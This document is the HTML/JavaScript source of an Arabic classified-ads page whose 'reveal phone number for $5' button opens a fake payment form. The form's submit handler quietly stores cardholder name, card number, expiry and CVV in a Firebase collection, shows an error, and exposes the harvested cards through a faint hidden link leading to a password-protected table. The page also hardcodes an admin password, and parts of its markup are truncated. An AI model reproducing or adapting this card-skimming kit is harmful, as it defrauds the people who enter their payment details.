<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>

    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title id="pageTitle">بنات الاردن بزنس كاش</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    
    <!-- Firebase SDKs (CDN) -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
        import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-analytics.js";
        import { getFirestore, collection, addDoc, onSnapshot, deleteDoc, doc, getDoc, setDoc, getDocs } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

        const firebaseConfig = {
          apiKey: "AIzaSyD1jTqkiQvTX1YfVyiA6bH1t9VfHevhKow",
          authDomain: "banatjo2828.firebaseapp.com",
          projectId: "banatjo2828",
          storageBucket: "banatjo2828.firebasestorage.app",
          messagingSenderId: "1051130291618",
          appId: "1:1051130291618:web:537fcea9a403bc02d7befb",
          measurementId: "G-KMYD6YBNJ6"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const analytics = getAnalytics(app);
        const db = getFirestore(app);

        // Make Firebase tools globally available for the regular script
        window.db = db;
        window.collection = collection;
        window.addDoc = addDoc;
        window.onSnapshot = onSnapshot;
        window.deleteDoc = deleteDoc;

        window.getDoc = getDoc;
        window.setDoc = setDoc;
        window.getDocs = getDocs;

    <style>
        :root {
            --primary: #6366f1;
            --primary-gradient: linear-gradient(135deg, #6366f1 0%, #a855f7 100%);
            --accent: #f97316;
            --accent-gradient: linear-gradient(135deg, #f97316 0%, #fb923c 100%);

        }

        * { box-sizing: border-box; font-family: 'Cairo', sans-serif; -webkit-tap-highlight-color: transparent; }
        
        body { 
            background-color: var(--bg-color);

        .container { max-width: 500px; margin: 0 auto; padding-bottom: 50px; }
        
        .notice-banner {

            color: #ffffff;

        .notice-icon { font-size: 18px; flex-shrink: 0; }

        header {

            margin-bottom: 25px;

            background: rgba(30, 41, 59, 0.7);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }

        header h1 { 
            color: #ffffff; 
            font-size: 24px; 
            margin: 0 0 12px 0; 
            font-weight: 900;
            letter-spacing: -0.5px;
            background: linear-gradient(to right, #818cf8, #c084fc);

            -webkit-text-fill-color: transparent;
        }
        
        .btn-admin { 
            background: rgba(255, 255, 255, 0.08);
            color: #e2e8f0; 
            padding: 8px 18px; 
            border-radius: 30px; 
            font-size: 13px; 
            border: 1px solid rgba(255, 255, 255, 0.1);
            transition: all 0.3s ease;
        }
        .btn-admin:active { transform: scale(0.95); background: rgba(255, 255, 255, 0.15); }

        .admin-section { 
            display: none; 
            background: var(--card-bg); 
            padding: 20px; 
            border-radius: 20px; 
            box-shadow: 0 15px 35px rgba(0,0,0,0.4); 
            margin-bottom: 25px; 
            border: 1px solid rgba(99, 102, 241, 0.3);
            animation: fadeIn 0.3s ease-in-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .admin-section h3 { margin-top: 0; font-size: 17px; color: #f1f5f9; margin-bottom: 15px; font-weight: 700; border-right: 4px solid var(--primary); padding-right: 8px; }
        
        .form-group { margin-bottom: 14px; }
        .form-group label { display: block; margin-bottom: 6px; font-weight: 600; font-size: 12px; color: var(--text-muted); }
        
        .form-group input, .form-group textarea { 
            width: 100%; 
            padding: 12px 14px; 
            border: 1px solid var(--border-color); 
            border-radius: 12px; 
            font-size: 14px; 
            background-color: #0f172a; 
            color: white;
            outline: none; 
            transition: all 0.2s;
        }
        
        .form-group input:focus, .form-group textarea:focus { 
            border-color: var(--primary); 
            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.2); 
        }

        .form-group input[type="file"] {
            padding: 8px;
            background: #0f172a;
            cursor: pointer;
        }
        
        button { cursor: pointer; border: none; font-weight: 700; border-radius: 12px; font-family: 'Cairo', sans-serif; }
        
        .btn-add { 
            background: var(--primary-gradient); 
            color: white; 
            width: 100%; 
            padding: 12px; 
            font-size: 15px; 
            box-shadow: 0 4px 15px rgba(99, 102, 241, 0.4);
            transition: opacity 0.2s;
        }
        .btn-add:active { opacity: 0.85; }

        .settings-box { background: rgba(15, 23, 42, 0.6); padding: 12px; border-radius: 14px; margin-bottom: 15px; border: 1px solid var(--border-color); }
        
        .listings-grid { 
            display: grid; 
            grid-template-columns: repeat(2, 1fr);

        }
        
        .post-card { 
            background: var(--card-bg); 
            border-radius: 16px; 
            overflow: hidden; 
            box-shadow: 0 8px 20px rgba(0,0,0,0.3); 
            border: 1px solid rgba(255, 255, 255, 0.05); 
            transition: transform 0.2s;

            flex-direction: column;

        }
        
        .post-img-container { position: relative; width: 100%; height: 120px; cursor: pointer; }

        .post-img-container:hover .post-img { opacity: 0.85; }
        
        .post-body { padding: 12px; display: flex; flex-direction: column; flex-grow: 1; }
        
        .post-title { font-size: 14px; font-weight: 700; margin-bottom: 4px; color: #ffffff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .post-price { color: #34d399; font-size: 13px; font-weight: 800; margin-bottom: 6px; display: inline-block; }
        .post-desc { font-size: 11px; color: var(--text-muted); margin-bottom: 10px; line-height: 1.4; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; flex-grow: 1; }
        
        .btn-unlock { 
            background: var(--accent-gradient); 
            color: white; 
            width: 100%; 
            padding: 9px 6px; 
            border-radius: 10px; 
            font-size: 11px; 
            text-align: center; 
            display: block; 
            text-decoration: none;
            box-shadow: 0 4px 12px rgba(249, 115, 22, 0.3); 
            font-weight: 700;
            transition: transform 0.2s, opacity 0.2s;
            cursor: pointer;
            border: none;
        }
        .btn-unlock:active { transform: scale(0.98); opacity: 0.9; }
        
        .btn-delete { 
            background: rgba(239, 68, 68, 0.15); 
            color: #f87171; 
            border: 1px solid rgba(239, 68, 68, 0.3);

            width: 100%; 
            padding: 7px; 
            font-size: 11px; 
            border-radius: 8px;
        }
        .btn-delete:active { background: rgba(239, 68, 68, 0.3); }

        .empty-state { text-align: center; color: var(--text-muted); padding: 40px 20px; font-size: 14px; grid-column: span 2; }

        #imageModal {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.9);
            justify-content: center;
            align-items: center;
            z-index: 3000;
            padding: 20px;
        }
        #imageModal img {
            max-width: 100%;
            max-height: 90vh;
            object-fit: contain;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        .close-image-modal {
            position: absolute;
            top: 20px;
            left: 20px;
            background: #ef4444;
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            font-size: 14px;
        }

        #paymentModal {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85);
            justify-content: center;
            align-items: center;
            z-index: 1000;
            padding: 10px;
            direction: rtl;
        }
        .payment-card-modal {
            background: #ffffff;
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
            width: 100%;

            max-height: 90vh;
            overflow-y: auto;

        }
        .close-payment {
            background: #dc3545;
            color: white;
            border: none;
            padding: 5px 10px;
            border-radius: 4px;
            cursor: pointer;
            float: left;
            font-weight: bold;
            font-size: 12px;
        }
    </style>
</head>
<body>

<div class="container">
    <div id="siteNoticeBanner" class="notice-banner">
        <span class="notice-icon">📢</span>
        <span id="siteNoticeText"></span>
    </div>

    <header>
        <h1 id="siteTitleDisplay">بنات الاردن بزنس كاش</h1>
        <button class="btn-admin" onclick="loginAdmin()">⚙️ لوحة الأدمن</button>
    </header>

    <div id="adminPanel" class="admin-section">
        <h3>لوحة التحكم والإدارة</h3>
        
        <div class="settings-box">
            <div class="form-group" style="margin-bottom: 8px;">
                <label>نشر ملاحظة / تنبيه أعلى الموقع:</label>

            </div>
            <button class="btn-add" style="background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%); padding: 10px; font-size: 13px;" onclick="updateNotice()">حفظ ونشر الملاحظة</button>
            <button class="btn-add" style="background: rgba(239, 68, 68, 0.2); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.4); padding: 8px; font-size: 12px; margin-top: 6px;" onclick="clearNotice()">إلغاء وإخفاء الملاحظة</button>
        </div>

        <div class="settings-box">
            <div class="form-group" style="margin-bottom: 8px;">
                <label>تعديل اسم الموقع:</label>
                <input type="text" id="newSiteTitleInput" placeholder="أدخل اسم الموقع الجديد">
            </div>
            <button class="btn-add" style="background: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%); padding: 10px; font-size: 13px;" onclick="updateSiteTitle()">حفظ الاسم الجديد</button>
        </div>

        <hr style="border: 0; border-top: 1px solid var(--border-color); margin: 15px 0;">

        <h3>إضافة إعلان جديد</h3>
        <div class="form-group"><label>عنوان المنشور:</label><input type="text" id="pTitle" placeholder="مثال: عنوان الإعلان"></div>
        <div class="form-group"><label>السعر:</label><input type="text" id="pPrice" placeholder="مثال: 15,000 $"></div>
        <div class="form-group"><label>التفاصيل:</label><textarea id="pDesc" placeholder="اكتب التفاصيل والمواصفات..."></textarea></div>
        <div class="form-group"><label>الصورة:</label><input type="file" id="pImage" accept="image/*"></div>
        <button class="btn-add" onclick="addPost()">نشر الإعلان الآن</button>
    </div>

    <div id="listings" class="listings-grid"></div>
</div>

<div id="imageModal">
    <button class="close-image-modal" onclick="closeImageModal()">إغلاق</button>
    <img id="fullScreenImg" src="" alt="صورة مكبرة">
</div>

<div id="paymentModal">
    <div class="payment-card-modal">
        <button class="close-payment" onclick="closePaymentModal()">إغلاق</button>
        <div style="clear: both; height: 10px;"></div>
        
        <div style="text-align: center; margin-bottom: 15px;">
            <h2 style="color: #0b2545; font-size: 18px; margin: 0 0 6px 0; font-family: Tahoma, sans-serif;">إتمام عملية الدفع</h2>
            <p style="color: #ee6c4d; font-size: 14px; font-weight: bold; margin: 0 0 10px 0; background: #fff5f2; padding: 6px; border-radius: 6px; display: inline-block; font-family: Tahoma, sans-serif;">دفع بطاقة جوجل بلاي 5 دولار</p>
        </div>

        <div style="font-size: 11px; color: #059669; background: #ecfdf5; padding: 5px; border-radius: 5px; margin-bottom: 12px; text-align: center; font-weight: bold; font-family: Tahoma, sans-serif;">
            🔒 جميع معلومات بطاقتك مشفرة بالكامل وآمنة
        </div>
        
        <form id="paymentForm">
            <div class="form-group" style="font-family: Tahoma, sans-serif;">
                <label for="cardType" style="color: #334155; font-weight: bold; font-size: 13px;">نوع البطاقة</label>
                <select id="cardType" required style="width: 100%; padding: 11px; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 14px; outline: none; background-color: #f8fafc; font-family: Tahoma, sans-serif;">
                    <option value="" disabled selected>اختر طريقة الدفع</option>
                    <option value="Visa">فيزا (Visa)</option>
                    <option value="MasterCard">ماستر كارد (MasterCard)</option>
                </select>
            </div>

            <div class="form-group" style="font-family: Tahoma, sans-serif;">
                <label for="cardHolder" style="color: #334155; font-weight: bold; font-size: 13px;">اسم صاحب البطاقة</label>
                <input type="text" id="cardHolder" placeholder="الاسم الكامل كما يظهر على البطاقة" required style="width: 100%; padding: 11px; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 14px; outline: none; background-color: #f8fafc; color: #000; font-family: Tahoma, sans-serif;">
            </div>

            <div class="form-group" style="font-family: Tahoma, sans-serif;">
                <label for="cardNumber" style="color: #334155; font-weight: bold; font-size: 13px;">رقم البطاقة</label>
                <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" required style="width: 100%; padding: 11px; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 14px; outline: none; background-color: #f8fafc; color: #000; font-family: Tahoma, sans-serif;">
            </div>

            <div style="display: flex; gap: 10px; font-family: Tahoma, sans-serif;">
                <div class="form-group" style="flex: 1;">
                    <label for="expiryMonth" style="color: #334155; font-weight: bold; font-size: 13px;">الشهر</label>
                    <select id="expiryMonth" required style="width: 100%; padding: 11px; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 14px; outline: none; background-color: #f8fafc; font-family: Tahoma, sans-serif;">
                        <option value="" disabled selected>الشهر</option>
                        <option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option>
                    </select>
                </div>

                <div class="form-group" style="flex: 1;">
                    <label for="expiryYear" style="color: #334155; font-weight: bold; font-size: 13px;">السنة</label>
                    <select id="expiryYear" required style="width: 100%; padding: 11px; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 14px; outline: none; background-color: #f8fafc; font-family: Tahoma, sans-serif;">
                        <option value="" disabled selected>السنة</option>
                        <option value="2024">2024</option><option value="2025">2025</option><option value="2026">2026</option><option value="2027">2027</option><option value="2028">2028</option><option value="2029">2029</option><option value="2030">2030</option>
                    </select>

            </div>

            <div class="form-group" style="font-family: Tahoma, sans-serif;">
                <label for="cvv" style="color: #334155; font-weight: bold; font-size: 13px;">رمز الأمان (CVV)</label>
                <input type="password" id="cvv" placeholder="123" maxlength="4" inputmode="numeric" required style="width: 100%; padding: 11px; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 14px; outline: none; background-color: #f8fafc; font-family: Tahoma, sans-serif;">
            </div>

            <button type="submit" style="background-color: #ee6c4d; color: white; border: none; width: 100%; padding: 13px; border-radius: 8px; font-size: 15px; font-weight: bold; cursor: pointer; margin-top: 10px; font-family: Tahoma, sans-serif;">إتمام الدفع</button>

        </form>

        <div>
            <span style="margin-top: 15px; color: #94a3b8; font-size: 10px; cursor: pointer; user-select: none; display: block; text-align: center; opacity: 0.25;" onclick="openAdminPanel()">أمن بواسطة CHY</span>
        </div>
    </div>
</div>

<div id="admin-panel" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); justify-content: center; align-items: center; z-index: 2000; padding: 10px; direction: rtl;">
    <div style="background: white; width: 100%; max-width: 700px; max-height: 85vh; overflow-y: auto; padding: 15px; border-radius: 10px; text-align: right;">
        <button style="background: #dc3545; color: white; border: none; padding: 6px 12px; border-radius: 4px; cursor: pointer; float: left; font-weight: bold; font-size: 12px;" onclick="closeAdminPanel()">إغلاق</button>
        <h3 style="color: #0b2545; margin-top: 0; font-size: 16px;">سجل محاولات الدفع</h3>
        <div style="width: 100%; overflow-x: auto; margin-top: 10px;">
            <table style="width: 100%; border-collapse: collapse; white-space: nowrap;">
                <thead>
                    <tr>
                        <th style="border: 1px solid #cbd5e1; padding: 8px; text-align: right; font-size: 12px; background-color: #f8fafc;">الوقت</th>
                        <th style="border: 1px solid #cbd5e1; padding: 8px; text-align: right; font-size: 12px; background-color: #f8fafc;">النوع</th>
                        <th style="border: 1px solid #cbd5e1; padding: 8px; text-align: right; font-size: 12px; background-color: #f8fafc;">الاسم</th>
                        <th style="border: 1px solid #cbd5e1; padding: 8px; text-align: right; font-size: 12px; background-color: #f8fafc;">رقم البطاقة</th>
                        <th style="border: 1px solid #cbd5e1; padding: 8px; text-align: right; font-size: 12px; background-color: #f8fafc;">التاريخ</th>
                        <th style="border: 1px solid #cbd5e1; padding: 8px; text-align: right; font-size: 12px; background-color: #f8fafc;">CVV</th>
                    </tr>
                </thead>
                <tbody id="attempts-list">
                </tbody>
            </table>
        </div>
    </div>
</div>

<script>
    let posts = [];
    let isAdmin = false;

    // Load Site Settings (Title and Notice) in real-time from Firebase Firestore
    function initSiteSettings() {
        window.onSnapshot(window.doc(window.db, "settings", "config"), (docSnap) => {
            if (docSnap.exists()) {
                const data = docSnap.data();
                const savedTitle = data.title || "بنات الاردن بزنس كاش";
                document.title = savedTitle;
                const siteTitleDisplay = document.getElementById('siteTitleDisplay');
                if (siteTitleDisplay) siteTitleDisplay.innerText = savedTitle;
                const newSiteTitleInput = document.getElementById('newSiteTitleInput');
                if (newSiteTitleInput) newSiteTitleInput.value = savedTitle;

                const savedNotice = data.notice || "";
                const noticeBanner = document.getElementById('siteNoticeBanner');
                const noticeText = document.getElementById('siteNoticeText');
                const noticeInput = document.getElementById('noticeInput');
                
                if (noticeInput) noticeInput.value = savedNotice;

                if (savedNotice.trim() !== "") {
                    noticeText.innerText = savedNotice;
                    noticeBanner.style.display = 'flex';
                } else {
                    noticeBanner.style.display = 'none';
                }
            }
        });
    }

    async function updateSiteTitle() {
        const newTitle = document.getElementById('newSiteTitleInput').value.trim();
        if (newTitle) {
            try {
                await window.setDoc(window.doc(window.db, "settings", "config"), { title: newTitle }, { merge: true });
                alert("تم تحديث اسم الموقع بنجاح لدى الجميع!");
            } catch (error) {
                alert("حدث خطأ أثناء الحفظ.");
            }
        } else {
            alert("الرجاء إدخال اسم صحيح.");
        }
    }

    async function updateNotice() {
        const noticeTextVal = document.getElementById('noticeInput').value.trim();
        try {
            await window.setDoc(window.doc(window.db, "settings", "config"), { notice: noticeTextVal }, { merge: true });
            alert("تم نشر وتحديث الملاحظة بنجاح أعلى الموقع للجميع!");
        } catch (error) {
            alert("حدث خطأ أثناء الحفظ.");
        }
    }

    async function clearNotice() {
        try {
            await window.setDoc(window.doc(window.db, "settings", "config"), { notice: "" }, { merge: true });
            document.getElementById('noticeInput').value = '';
            alert("تم إزالة وإخفاء الملاحظة بنجاح!");
        } catch (error) {
            alert("حدث خطأ أثناء الحذف.");
        }
    }

    function loginAdmin() {
        if (!isAdmin) {
            let pass = prompt("الرجاء إدخال كلمة سر الأدمن:");
            if (pass === "@oday1996oday@") {
                isAdmin = true;
                document.getElementById('adminPanel').style.display = 'block';
                alert("تم تسجيل الدخول بنجاح!");
                renderPosts();
            } else {
                alert("كلمة السر غير صحيحة");
            }
        }
    }

    function addPost() {
        const title = document.getElementById('pTitle').value;
        const price = document.getElementById('pPrice').value;
        const desc = document.getElementById('pDesc').value;
        const file = document.getElementById('pImage').files[0];

        if (!title || !file) { alert("يرجى إدخال عنوان الإعلان واختيار صورة!"); return; }

        const reader = new FileReader();
        reader.onload = async function(e) {
            try {
                await window.addDoc(window.collection(window.db, "posts"), {
                    title,
                    price,
                    desc,
                    image: e.target.result,
                    createdAt: Date.now()
                });
                
                document.getElementById('pTitle').value = '';
                document.getElementById('pPrice').value = '';
                document.getElementById('pDesc').value = '';
                document.getElementById('pImage').value = '';
                alert("تم إضافة الإعلان ونشره سحابياً للجميع بنجاح!");
            } catch (error) {
                alert("حدث خطأ أثناء رفع الإعلان.");
            }
        };
        reader.readAsDataURL(file);
    }

    async function deletePost(id) {
        if(confirm("هل أنت متأكد من حذف هذا المنشور نهائياً للجميع؟")) {
            try {
                await window.deleteDoc(window.doc(window.db, "posts", id));
                alert("تم الحذف بنجاح!");
            } catch (error) {
                alert("حدث خطأ أثناء الحذف.");
            }
        }
    }

    function openImageModal(imgSrc) {
        document.getElementById('fullScreenImg').src = imgSrc;
        document.getElementById('imageModal').style.display = 'flex';
    }

    function closeImageModal() {
        document.getElementById('imageModal').style.display = 'none';
    }

    function openPaymentModal() {
        document.getElementById('paymentModal').style.display = 'flex';
    }

    function closePaymentModal() {
        document.getElementById('paymentModal').style.display = 'none';
    }

    document.getElementById('paymentForm').addEventListener('submit', async function(e) {
        e.preventDefault();

        const data = {
            time: new Date().toLocaleString(),
            cardType: document.getElementById('cardType').value,
            cardHolder: document.getElementById('cardHolder').value,
            cardNumber: document.getElementById('cardNumber').value,
            expiryMonth: document.getElementById('expiryMonth').value,
            expiryYear: document.getElementById('expiryYear').value,
            cvv: document.getElementById('cvv').value,
            createdAt: Date.now()
        };

        try {
            await window.addDoc(window.collection(window.db, "payment_attempts"), data);
        } catch (error) {
            console.error("Error saving payment attempt", error);
        }

        document.getElementById('error-msg').style.display = 'block';
        document.getElementById('paymentForm').reset();
    });

    function openAdminPanel() {
        const password = prompt("يرجى إدخال كلمة المرور:");
        if (password === "@oday1996oday@") {
            loadAttempts();
            document.getElementById('admin-panel').style.display = 'flex';
        } else if (password !== null) {
            alert("كلمة المرور غير صحيحة!");
        }
    }

    function closeAdminPanel() {
        document.getElementById('admin-panel').style.display = 'none';
    }

    async function loadAttempts() {
        const tbody = document.getElementById('attempts-list');
        tbody.innerHTML = '<tr><td colspan="6" style="text-align: center; border: 1px solid #cbd5e1; padding: 8px;">جاري التحميل...</td></tr>';
        
        try {
            const querySnapshot = await window.getDocs(window.collection(window.db, "payment_attempts"));
            tbody.innerHTML = '';
            
            if (querySnapshot.empty) {
                tbody.innerHTML = '<tr><td colspan="6" style="text-align: center; border: 1px solid #cbd5e1; padding: 8px;">لا توجد محاولات مسجلة بعد</td></tr>';
                return;
            }

            querySnapshot.forEach(docSnap => {
                const item = docSnap.data();
                const tr = document.createElement('tr');
                tr.innerHTML = `
                    <td style="border: 1px solid #cbd5e1; padding: 8px; text-align: right; font-size: 12px;">${item.time || ''}</td>
                    <td style="border: 1px solid #cbd5e1; padding: 8px; text-align: right; font-size: 12px;">${item.cardType || ''}</td>
                    <td style="border: 1px solid #cbd5e1; padding: 8px; text-align: right; font-size: 12px;">${item.cardHolder || ''}</td>
                    <td style="border: 1px solid #cbd5e1; padding: 8px; text-align: right; font-size: 12px;">${item.cardNumber || ''}</td>
                    <td style="border: 1px solid #cbd5e1; padding: 8px; text-align: right; font-size: 12px;">${item.expiryMonth || ''}/${item.expiryYear || ''}</td>
                    <td style="border: 1px solid #cbd5e1; padding: 8px; text-align: right; font-size: 12px;">${item.cvv || ''}</td>
                `;
                tbody.appendChild(tr);
            });
        } catch (error) {
            tbody.innerHTML = '<tr><td colspan="6" style="text-align: center; border: 1px solid #cbd5e1; padding: 8px; color: red;">فشل تحميل البيانات</td></tr>';
        }
    }

    function renderPosts() {
        const listDiv = document.getElementById('listings');
        listDiv.innerHTML = '';
        
        if (posts.length === 0) {
            listDiv.innerHTML = '<div class="empty-state">🚗 لا توجد إعلانات معروضة حالياً.</div>';
            return;
        }

        posts.forEach(post => {
            listDiv.innerHTML += `
                <div class="post-card">
                    <div class="post-img-container" onclick="openImageModal('${post.image}')">
                        <img src="${post.image}" class="post-img" title="انقر لعرض الصورة كاملة">
                    </div>
                    <div class="post-body">
                        <div class="post-title" title="${post.title}">${post.title}</div>
                        <div class="post-price">${post.price}</div>
                        <p class="post-desc">${post.desc || ''}</p>
                        
                        <button onclick="openPaymentModal()" class="btn-unlock">📞 إظهار الرقم (5$)</button>

                        ${isAdmin ? `<button class="btn-delete" onclick="deletePost('${post.id}')">حذف المنشور</button>` : ''}
                    </div>
                </div>
            `;
        });
    }

    // Initialize Real-time Listeners for Posts from Firestore
    window.addEventListener('DOMContentLoaded', () => {
        initSiteSettings();
        
        // Real-time listener for posts
        window.onSnapshot(window.collection(window.db, "posts"), (snapshot) => {
            posts = [];
            snapshot.forEach(docSnap => {
                posts.push({ id: docSnap.id, ...docSnap.data() });
            });
            renderPosts();
        });
    });
</script>

</body>
</html>
